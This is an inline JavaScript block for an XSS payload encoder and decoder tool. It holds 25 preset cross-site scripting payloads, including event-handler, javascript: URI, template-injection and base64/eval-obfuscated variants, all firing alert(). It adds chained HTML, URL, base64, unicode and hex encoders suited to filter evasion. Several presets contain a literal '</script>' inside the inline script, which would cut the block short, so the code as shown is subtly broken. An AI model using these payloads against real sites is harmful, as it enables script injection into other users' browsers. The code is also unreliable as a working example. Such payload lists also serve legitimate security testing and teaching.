<script>
  (function() {
    // ----- DOM refs -----
    const inputEl = document.getElementById('payloadInput');
    const outputEl = document.getElementById('outputDisplay');
    const modeSelect = document.getElementById('modeSelect');
    const encodeBtn = document.getElementById('encodeBtn');
    const decodeBtn = document.getElementById('decodeBtn');
    const copyBtn = document.getElementById('copyBtn');
    const clearBtn = document.getElementById('clearBtn');
    const chainToggle = document.getElementById('chainToggle');
    const chainBadge = document.getElementById('chainBadge');
    const presetContainer = document.getElementById('presetContainer');
    const presetCount = document.getElementById('presetCount');
    const copyFeedback = document.getElementById('copyFeedback');

    // ----- 25 safe XSS presets (educational) -----
    const presets = [
      "<script>alert('XSS')</script>",
      "<img src=x onerror=alert(1)>",
      "<svg onload=alert(1)>",
      "javascript:alert('XSS')",
      "\"><script>alert(1)</script>",
      "'-alert(1)-'",
      "<body onload=alert(1)>",
      "<input onfocus=alert(1) autofocus>",
      "<details open ontoggle=alert(1)>",
      "<iframe src=javascript:alert(1)>",
      "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>",
      "{{constructor.constructor('alert(1)')()}}",
      "';alert(1);//",
      "<a href=\"javascript:alert(1)\">click</a>",
      "<div onmouseover=alert(1)>hover</div>",
      "<!--<script>alert(1)</script>-->",
      "<![CDATA[<script>alert(1)</script>]]>",
      "<%00script>alert(1)</script>",
      "<script>alert(String.fromCharCode(88,83,83))</script>",
      "<script>eval(atob('YWxlcnQoMSk='))</script>",
      "1<script>alert(1)</script>",
      "<script src=data:text/javascript,alert(1)>",
      "<marquee onstart=alert(1)>",
      "<isindex type=image src=x onerror=alert(1)>",
      "<script>window.onerror=eval;throw'=alert\\x281\\x29'</script>"
    ];

    // render preset chips
    function renderPresets() {
      presetContainer.innerHTML = '';
      presets.forEach((p, idx) => {
        const chip = document.createElement('span');
        chip.className = 'preset-chip';
        // show short preview
        const short = p.length > 28 ? p.substring(0, 25) + '…' : p;
        chip.textContent = short;
        chip.title = p;
        chip.dataset.index = idx;
        chip.addEventListener('click', function(e) {
          inputEl.value = presets[parseInt(this.dataset.index)];
          // auto encode? we just set input, user can click encode
          outputEl.textContent = '⏎ press Encode or Decode';
          copyFeedback.textContent = '';
        });
        presetContainer.appendChild(chip);
      });
      presetCount.textContent = `${presets.length} presets loaded`;
    }
    renderPresets();

    // ----- encoding functions -----
    function htmlEntityEncode(str) {
      return str.replace(/[&<>"'`]/g, function(m) {
        if (m === '&') return '&amp;';
        if (m === '<') return '&lt;';
        if (m === '>') return '&gt;';
        if (m === '"') return '&quot;';
        if (m === "'") return '&#x27;';
        if (m === '`') return '&#x60;';
        return m;
      });
    }

    function urlEncode(str) {
      return encodeURIComponent(str);
    }

    function base64Encode(str) {
      try {
        return btoa(unescape(encodeURIComponent(str)));
      } catch (e) {
        return '[Base64 error]';
      }
    }

    function unicodeEscape(str) {
      let out = '';
      for (let ch of str) {
        let code = ch.charCodeAt(0);
        if (code < 128) {
          out += '\\u' + code.toString(16).padStart(4, '0');
        } else {
          out += ch; // keep non-ascii as is
        }
      }
      return out;
    }

    function hexEncode(str) {
      let out = '';
      for (let ch of str) {
        let code = ch.charCodeAt(0);
        out += '\\x' + code.toString(16).padStart(2, '0');
      }
      return out;
    }

    function doubleEncode(str) {
      // HTML entity first, then URL encode
      let htmlEnc = htmlEntityEncode(str);
      return urlEncode(htmlEnc);
    }

    // ----- decode functions -----
    function decodeHTML(str) {
      let txt = document.createElement('textarea');
      txt.innerHTML = str;
      return txt.value;
    }

    function urlDecode(str) {
      try {
        return decodeURIComponent(str.replace(/\+/g, ' '));
      } catch (e) {
        return str;
      }
    }

    function base64Decode(str) {
      try {
        return decodeURIComponent(escape(atob(str)));
      } catch (e) {
        return '[invalid base64]';
      }
    }

    function unicodeUnescape(str) {
      return str.replace(/\\u([0-9a-fA-F]{4})/g, (m, code) => String.fromCharCode(parseInt(code, 16)));
    }

    function hexDecode(str) {
      return str.replace(/\\x([0-9a-fA-F]{2})/g, (m, code) => String.fromCharCode(parseInt(code, 16)));
    }

    // main encode dispatch
    function encodeText(text, mode) {
      switch (mode) {
        case 'htmlEntity': return htmlEntityEncode(text);
        case 'urlEncode': return urlEncode(text);
        case 'base64': return base64Encode(text);
        case 'unicodeEscape': return unicodeEscape(text);
        case 'hexEncode': return hexEncode(text);
        case 'doubleEncode': return doubleEncode(text);
        default: return text;
      }
    }

    function decodeText(text, mode) {
      // best effort decode based on mode
      switch (mode) {
        case 'htmlEntity': return decodeHTML(text);
        case 'urlEncode': return urlDecode(text);
        case 'base64': return base64Decode(text);
        case 'unicodeEscape': return unicodeUnescape(text);
        case 'hexEncode': return hexDecode(text);
        case 'doubleEncode': {
          // double: first URL decode, then HTML decode
          let urlDec = urlDecode(text);
          return decodeHTML(urlDec);
        }
        default: return text;
      }
    }

    // ----- interactive logic -----
    function performEncode() {
      let input = inputEl.value;
      let mode = modeSelect.value;
      let chain = chainToggle.checked;

      let result = encodeText(input, mode);
      if (chain) {
        // re-encode: encode again with same mode
        result = encodeText(result, mode);
      }
      outputEl.textContent = result || '(empty)';
      copyFeedback.textContent = '';
    }

    function performDecode() {
      let input = inputEl.value;
      let mode = modeSelect.value;
      let result = decodeText(input, mode);
      outputEl.textContent = result || '(empty)';
      copyFeedback.textContent = '';
    }

    // copy
    copyBtn.addEventListener('click', function() {
      let text = outputEl.textContent;
      if (!text || text === '(empty)') {
        copyFeedback.textContent = '⚠️ nothing to copy';
        return;
      }
      navigator.clipboard.writeText(text).then(() => {
        copyFeedback.textContent = '✅ copied!';
      }).catch(() => {
        copyFeedback.textContent = '❌ copy failed';
      });
    });

    clearBtn.addEventListener('click', function() {
      outputEl.textContent = '';
      copyFeedback.textContent = '';
    });

    // event listeners
    encodeBtn.addEventListener('click', performEncode);
    decodeBtn.addEventListener('click', performDecode);

    // chain toggle badge
    chainToggle.addEventListener('change', function() {
      chainBadge.textContent = this.checked ? '⛓️ chain: on' : '⛓️ chain: off';
    });

    // initial: show something (decode HTML of default)
    window.addEventListener('load', function() {
      // default input is html entity, decode to show readable
      let defaultInput = inputEl.value;
      let decoded = decodeHTML(defaultInput);
      outputEl.textContent = decoded;
      chainBadge.textContent = '⛓️ chain: off';
    });

    // extra: double click preset to encode? not needed

  })();
</script>
